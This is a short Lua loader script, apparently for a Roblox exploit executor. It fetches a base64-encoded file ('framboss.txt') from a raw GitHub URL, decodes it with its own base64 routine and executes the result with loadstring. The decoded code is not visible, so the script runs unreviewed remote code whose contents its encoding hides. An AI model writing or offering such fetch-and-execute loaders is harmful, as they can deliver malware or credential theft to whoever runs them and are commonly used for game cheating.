local url = "https://raw.githubusercontent.com/ngheo6677/Dung/refs/heads/main/framboss.txt"

local function decodeBase64(data)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	data = data:gsub('[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f = '', (b:find(x) - 1)
		for i = 6, 1, -1 do
			r = r .. (f % 2^i - f % 2^(i - 1) > 0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c = 0
		for i = 1, 8 do
			c = c + (x:sub(i, i) == '1' and 2^(8 - i) or 0)
		end
		return string.char(c)
	end))
end

local success, encoded = pcall(function()
	return game:HttpGet(url)
end)

if success and encoded then
	local decoded = decodeBase64(encoded)
	local func, err = loadstring(decoded)
	if func then
		func()
	else
		warn("[Decode Error]:", err)
	end
else
	warn("[HTTP Error]:", encoded)
end